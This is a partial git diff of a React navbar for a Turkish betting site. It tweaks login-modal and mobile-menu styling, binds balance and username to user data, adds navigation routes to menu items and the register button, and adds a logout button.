           <div 
-            className={`bg-[#202123]/70 backdrop-blur-sm transition-opacity duration-400 absolute inset-0 ${
+            className={`bg-[#202123]/70 backdrop-blur-xs transition-opacity duration-400 absolute inset-0 ${
               showLoginModal ? 'opacity-100' : 'opacity-0'
             }`}
           />
@@ -1319,14 +1330,14 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
                   x
                 </button>
 
-                <h1 className="text-white text-2xl font-bold mb-1">Hoşgeldiniz</h1>
+                <h1 className="text-white text-xl font-bold mb-1">Hoşgeldiniz</h1>
               </div>
 
               {/* Body Section */}
-              <div className="px-8 pt-8 pb-6 flex-1 overflow-y-auto">
+              <div className="px-6 pt-13 pb-6 flex-1 overflow-y-auto">
                 {/* Username/Email Input */}
                 <div className="mb-6">
-                  <label className="block text-white text-sm mb-2 font-medium">
+                  <label className="block text-white text-xs mb-2 font-medium">
                     <span className="text-red-600 mr-0.5">*</span>Kullanıcı adınız veya Email Adresiniz
                   </label>
                   <input 
@@ -1334,14 +1345,14 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
                     value={username}
                     onChange={(e) => setUsername(e.target.value)}
                     placeholder="Lütfen Kullanıcı Adınızı veya Email Adresinizi girin"
-                    className="w-full px-4 py-3 bg-white border border-gray-300 rounded-[4px] text-gray-700 text-base focus:outline-none focus:border-[#f4d03f] transition-colors placeholder-gray-400"
+                    className="w-full px-4 mt-2 py-2 bg-white border border-gray-300 rounded-[4px] text-gray-700 text-base focus:outline-none focus:border-[#f4d03f] transition-colors placeholder:text-sm placeholder-gray-400"
                     disabled={isLoggingIn}
                   />
                 </div>
 
                 {/* Password Input */}
                 <div className="mb-8">
-                  <label className="block text-white text-sm mb-2 font-medium">
+                  <label className="block text-white text-xs mb-2 font-medium">
                     <span className="text-red-600 mr-0.5">*</span>Şifre
                   </label>
                   <div className="relative">
@@ -1350,7 +1361,7 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
                       placeholder="Lütfen şifrenizi girin."
-                      className="w-full px-4 py-3 bg-white border border-gray-300 rounded-[4px] text-gray-700 text-base focus:outline-none focus:border-[#f4d03f] transition-colors placeholder-gray-400 pr-10"
+                      className="w-full px-4 py-2 mt-2 placeholder:text-sm bg-white border border-gray-300 rounded-[4px] text-gray-700 text-base focus:outline-none focus:border-[#f4d03f] transition-colors placeholder-gray-400 pr-10"
                       disabled={isLoggingIn}
                     />
                     <button 
@@ -1363,7 +1374,7 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
                 </div>
 
                 {/* Info Text */}
-                <div className="mb-6 text-sm text-white leading-relaxed">
+                <div className="mb-6 text-xs  mt-2 text-white leading-relaxed">
                   <p>
                     Güncel adresimiz <span className="font-bold">www.jojobet1098.com</span>'dur. Bir sonraki güncellemede adresimiz <span className="font-bold">www.jojobet1099.com</span> olacaktır. Her zaman güncel adres için: <a href="#" className="text-[#eecf54] hover:underline">https://dub.run/jojoguncel</a> yazıp giriş yapabilirsiniz!
                   </p>
@@ -1631,10 +1642,10 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
           {/* --- Logo --- */}
         <div className='flex items-center justify-center gap-2 pl-4' > 
             {/* --- Menu icon 3 line for mobile --- */}
-           <div className='flex flex-col md:hidden gap-1 '>
-            <div className='w-7 h-1 bg-[#F9C408] rounded-full'></div>
-            <div className='w-7 h-1 bg-[#F9C408] rounded-full'></div> 
-            <div className='w-7 h-1 bg-[#F9C408] rounded-full'></div> 
+           <div className='flex flex-col md:hidden gap-[5px] '>
+            <div className='w-4 h-[1px] bg-white rounded-full'></div>
+            <div className='w-4 h-[1px] bg-white rounded-full'></div> 
+            <div className='w-4 h-[1px] bg-white rounded-full'></div> 
            </div>
            <Image onClick={() => router.push('/')} className=' md:w-[190px] w-[130px] h-auto cursor-pointer' src={logo} alt="logo"  /> 
         </div>
@@ -1654,11 +1665,11 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
                      <>
                       {/* Balance Display */}
                       <div 
-                        className='flex cursor-pointer items-center md:gap-4 gap-1 bg-[#F9C408] md:px-3 px-2 md:py-2 py-[2px] rounded-md'
-                        onClick={handleBalanceClick}
+                       className='flex cursor-pointer items-center md:gap-4 gap-1 bg-[#F9C408] md:px-3 px-2 md:py-2 py-[2px] rounded-md'
+                       onClick={handleBalanceClick}
                       >
                         <span className='text-[#294c0b] font-bold text-xs'>
-                          {userData.balance.toFixed(2)} {userData.currency} 
+                          {userData?.totalBakiyeBilgisi || '0.00'} {userData?.currency || '₺'} 
                         </span>
                         <span className='text-[#294c0b] font-bold text-md'>+</span>
                       </div>
@@ -1675,12 +1686,11 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
                         {isProfileMenuOpen && (
                           <div 
                             ref={profileMenuRef}
-                            className="absolute bg-white hadow-lg z-50"
+                            className="absolute md:w-[350px] md:h-[690px] w-screen h-screen bg-white hadow-lg z-50"
                             style={{
-                              width: '350px',
-                              height: '690px',
+                          
                               top: 'calc(100% + 10px)',
-                              right: '0px'
+                              right: '-10px'
                             }}
                           >
                              <div className=' flex flex-col w-full h-full '>
@@ -1694,7 +1704,7 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
                                      </div>
 
                                      <div className='flex flex-col '>
-                                       <p className='text-[#294c0b]  text-[22px] '>testselenium3169</p>
+                                       <p className='text-[#294c0b]  text-[22px] '>{userData?.username || 'Kullanıcı'}</p>
                                        <p className='text-xs font-gray-600 tracking-wider'>Hesap Güvenliği</p>
                                       
                                       </div>
@@ -1709,17 +1719,17 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
                                <div className='flex w-full h-[94px] bg-[#294c0b] text-white'>
                                     <div className='flex flex-col items-center justify-center gap-2 w-1/3 h-full '>
                                         <p className='text-sm font-bold'>Bakiyeniz</p>
-                                        <p className='text-md font-bold'>{userData.balance.toFixed(2)} {userData.currency}</p>
+                                        <p className='text-md font-bold'>{userData?.totalBakiyeBilgisi || '0.00'} {userData?.currency || '₺'}</p>
                                     </div>
 
                                     <div className='flex flex-col items-center justify-center gap-2 w-1/3 h-full '>
                                         <p className='text-sm font-bold'>Bonus Bakiyeniz</p>
-                                        <p className='text-md font-bold'>0.00 {userData.currency}</p>
+                                        <p className='text-md font-bold'>0.00 {userData?.currency || '₺'}</p>
                                     </div>
 
                                     <div className='flex flex-col items-center justify-center gap-2 w-1/3 h-full '>
                                         <p className='text-sm font-bold text-center'>Toplam Bakiyeniz</p>
-                                        <p className='text-md font-bold'>{userData.balance.toFixed(2)} {userData.currency}</p>
+                                        <p className='text-md font-bold'>{userData?.totalBakiyeBilgisi || '0.00'} {userData?.currency || '₺'}</p>
                                     </div>
                                  
                                   
@@ -1728,24 +1738,24 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
 
 
                                {/* yapacağı işlemler */}
-                               <div className='flex flex-col w-full h-[335px] gap-5   py-2'>
+                               <div className='flex flex-col w-full h-[335px] gap-5  px-3  py-3'>
                                   
-                                  <div className='w-full  flex items-center '>
-                                    <div className='flex flex-col items-center  gap-2   '> {parayatiricon} <p className='text-sm text-[#294c0b] text-center '>PARA YATIR</p> </div>
-                                    <div className='flex flex-col items-center  gap-2     '> {paracekicon} <p className='text-sm text-[#294c0b] text-center '>PARA ÇEK</p> </div>
-                                    <div className='flex flex-col items-center  gap-2   '> {aktifbeticon} <p className='text-sm text-[#294c0b] text-center '>AKTİF BONUSLAR</p> </div>
-                                    <div className='flex flex-col items-center  gap-2    '> {gecmisbonus} <p className='text-sm text-[#294c0b] text-center '>GEÇMİŞ BONUSLARIM</p> </div>
+                                  <div className='w-full  flex items-center jus gap-3 '>
+                                    <div onClick={() => router.push('/payment')} className='flex-1 flex flex-col items-center    '> {parayatiricon} <p className='md:text-sm text-xs text-[#294c0b] text-center '>PARA YATIR</p> </div>
+                                    <div onClick={() => router.push('/menu/paracek')} className='flex-1 flex flex-col items-center  gap-2     '> {paracekicon} <p className='md:text-sm text-xs text-[#294c0b] text-center '>PARA ÇEK</p> </div>
+                                    <div onClick={() => router.push('/menu/aktifbonus')} className='flex-1 flex flex-col items-center  gap-2   '> {aktifbeticon} <p className='md:text-sm text-xs text-[#294c0b] text-center '>AKTİF BONUSLAR</p> </div>
+                                    <div onClick={() => router.push('/menu/gecmisbonus')} className='flex-1 flex flex-col items-center  gap-2    '> {gecmisbonus} <p className='md:text-sm text-xs text-[#294c0b] text-center '>GEÇMİŞ BONUSLARIM</p> </div>
                                   </div>
 
                                   <div className='w-full  flex items-center '>
-                                    <div className='flex flex-col items-center  gap-2   '> {sporgecmis} <p className='text-sm text-[#294c0b] text-center '>PARA YATIR</p> </div>
-                                    <div className='flex flex-col items-center  gap-2     '> {oyungecmisi} <p className='text-sm text-[#294c0b] text-center '>PARA ÇEK</p> </div>
-                                    <div className='flex flex-col items-center  gap-2   '> {hesapozetim} <p className='text-sm text-[#294c0b] text-center '>AKTİF BONUSLAR</p> </div>
-                                    <div className='flex flex-col items-center  gap-2    '> {bahiskurallar} <p className='text-sm text-[#294c0b] text-center '>GEÇMİŞ BONUSLARIM</p> </div>
+                                    <div className='flex flex-1 flex-col items-center  gap-2   '> {sporgecmis} <p className='md:text-sm text-xs text-[#294c0b] text-center '>SPOR GEÇMİŞİM</p> </div>
+                                    <div onClick={() => router.push('/menu/oyungecmisi')} className='flex flex-1 flex-col items-center  gap-2     '> {oyungecmisi} <p className='md:text-sm text-xs text-[#294c0b] text-center '>OYUN GEÇMİŞİM</p> </div>
+                                    <div onClick={() => router.push('/menu/odemegecmisi')} className='flex flex-1 flex-col items-center  gap-2   '> {hesapozetim} <p className='md:text-sm text-xs text-[#294c0b] text-center '>HESAP ÖZETİM</p> </div>
+                                    <div className='flex flex-1 flex-col items-center  gap-2    '> {bahiskurallar} <p className='md:text-sm text-xs text-[#294c0b] text-center '>BAHİS KURALLARI</p> </div>
                                   </div>
 
                                   <div className='w-full  flex flex-col items-center justify-center '> 
-                                      <div className='flex flex-col w-2 items-center  gap-2   '> {numaraguncelle} <p className='text-sm text-[#294c0b] text-center '>Numaranızı güncelleyin</p> </div>
+                                      <div className='flex flex-col w-2 items-center  gap-2   '> {numaraguncelle} <p className='md:text-sm text-xs text-[#294c0b] text-center '>Numaranızı güncelleyin</p> </div>
                                     
                                     </div>
                                 
@@ -1772,6 +1782,16 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
 
                                </div>
 
+                               {/* Çıkış Butonu */}
+                               <div className='flex w-full px-3 py-3'>
+                                 <button 
+                                   onClick={handleLogout}
+                                   className='w-full bg-red-500 hover:bg-red-600 text-white font-bold py-3 rounded-md transition-colors'
+                                 >
+                                   ÇIKIŞ YAP
+                                 </button>
+                               </div>
+
                               
 
                           
@@ -1793,7 +1813,7 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
                       {/*  kayıt ol ve giriş butonları - mobilde yer değiştir */} 
                       <div className='flex md:flex-row flex-row-reverse gap-2'>
                         {/*  kayıt ol */} 
-                        <button className=' cursor-pointer md:text-sm text-xs font-bold bg-[#F9C408] hover:bg-[#f9f108f5] text-[#294c0b] px-2 py-2 rounded-md'>KAYIT OL</button>
+                        <button onClick={() => router.push('/register')} className=' cursor-pointer md:text-sm text-xs font-bold bg-[#F9C408] hover:bg-[#f9f108f5] text-[#294c0b] px-2 py-2 rounded-md'>KAYIT OL</button>
 
                         {/*  giriş*/} 
                         <button onClick={handleLoginClick} className=' cursor-pointer md:text-[14px] text-xs font-bold  text-white  rounded-md'>GİRİŞ</button>
